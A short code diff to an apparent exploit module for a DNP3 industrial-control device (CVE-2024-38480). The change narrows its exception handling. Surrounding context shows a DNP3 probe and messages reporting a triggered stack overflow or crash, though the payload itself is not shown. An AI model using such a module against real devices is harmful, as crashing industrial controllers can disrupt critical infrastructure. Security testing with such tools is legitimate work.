@@ -83,7 +83,7 @@ class Exploit(Exploit):
             resp = s.recv(32)
             s.close()
             return resp[:2] == bytes([0x05, 0x64])  # DNP3 start bytes
-        except Exception:
+        except (ConnectionError, TimeoutError, OSError):
             return False
 
     def run(self):
@@ -128,5 +128,5 @@ class Exploit(Exploit):
                 print_success("[CVE-2024-38480] Connection reset - stack overflow triggered!")
             except TimeoutError:
                 print_success("[CVE-2024-38480] Timeout after payload - crash likely!")
-        except Exception as e:
+        except (ConnectionError, TimeoutError, OSError) as e:
             print_error(f"[CVE-2024-38480] {e}")
